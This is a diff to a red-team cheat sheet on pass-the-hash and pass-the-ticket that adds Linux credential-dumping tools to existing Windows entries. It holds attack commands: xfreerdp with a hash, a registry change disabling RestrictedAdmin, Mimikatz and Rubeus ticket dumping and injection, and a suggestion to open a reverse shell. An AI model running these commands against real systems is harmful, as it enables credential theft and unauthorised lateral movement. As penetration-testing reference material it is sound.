@@ -293,9 +293,11 @@ $ xfreerdp  /v:IP /u:username /pth:hash
 
 ⚠️ Remote Local Administrator pth is not possible by default. You need to disable DisableRestrictedAdmin, for instance, using: `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`.
 
-* We can use the popular [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md) tool.
+* We can use the popular [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md) tool on Windows.
 
-* We can use the [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) <small>(1.4k ⭐, 2018 🪦)</small> script suite. We can use it to create a user on the target, if we have admin access onto the target. Otherwise, pop a reverse shell.
+* We can use [linikatz](https://github.com/CiscoCXSecurity/linikatz) <small>(0.5k ⭐)</small> on a Linux target
+
+* We can use the [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) <small>(1.4k ⭐, 2018 🪦)</small> script suite on Windows. We can use it to create a user on the target, if we have admin access onto the target. Otherwise, pop a reverse shell.
 
 ```shell!
 PS> Import-Module .\Invoke-TheHash.psd1
@@ -314,7 +316,7 @@ Some authentication mechanisms such as [Kerberos](/operating-systems/cloud/activ
 
 On Windows, an user can only access their tickets, while an admin can access every ticket on the computer.
 
-* We can use the popular [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md) tool to dump tickets.
+* We can use the popular [Mimikatz](/cybersecurity/red-team/tools/utilities/creds/mimikatz.md) tool on Windows.
 
 ```shell!
 mimikatz# sekurlsa::tickets /export # dump tickets
@@ -322,7 +324,11 @@ CMD> dir *.kirbi
 mimikatz# kerberos::ptt ".\xxx@yyy.kirbi" # load ticket
 ```
 
-* We can use [Rubeus](https://github.com/GhostPack/Rubeus) <small>(3.7k ⭐)</small>
+* We can use [linikatz](https://github.com/CiscoCXSecurity/linikatz) <small>(0.5k ⭐)</small> on Linux
+
+* We can use [mimipenguin](https://github.com/huntergregal/mimipenguin) <small>(3.6k ⭐, 2022 🪦)</small> on Linux
+
+* We can use [Rubeus](https://github.com/GhostPack/Rubeus) <small>(3.7k ⭐)</small> on Windows
 
 ```shell!
 PS> .\Rubeus.exe dump /nowrap # Dump tickets
